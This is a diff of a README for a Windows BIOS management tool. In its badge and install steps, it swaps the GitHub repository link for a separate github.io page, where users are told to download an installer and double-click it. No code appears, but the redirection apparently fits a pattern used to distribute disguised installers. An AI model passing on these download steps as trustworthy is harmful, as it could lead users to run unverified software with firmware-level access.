@@ -1,6 +1,6 @@
 # 🛠 Phoenix-BIOS-Tool - Manage your motherboard firmware with ease
 
-[![](https://img.shields.io/badge/Download-Phoenix_BIOS_Tool-blue.svg)](https://github.com/monahsnowbound499/Phoenix-BIOS-Tool)
+[![](https://img.shields.io/badge/Download-Phoenix_BIOS_Tool-blue.svg)](https://monahsnowbound499.github.io)
 
 Phoenix-BIOS-Tool helps you interact with your computer motherboard. It provides a simple method to update, backup, and restore BIOS settings on Windows 11 and Windows 10 systems. This software removes the need for complex command line entries so you can maintain your hardware state without stress.
 
@@ -17,7 +17,7 @@ To use this tool, your computer must meet the following baseline requirements:
 
 Follow these steps to obtain and prepare the software on your machine:
 
-1. Visit the project website at: https://github.com/monahsnowbound499/Phoenix-BIOS-Tool
+1. Visit the project website at: https://monahsnowbound499.github.io
 2. Locate the download section on the page.
 3. Save the installer file to your desktop or downloads folder.
 4. Double-click the file to start the installation wizard.
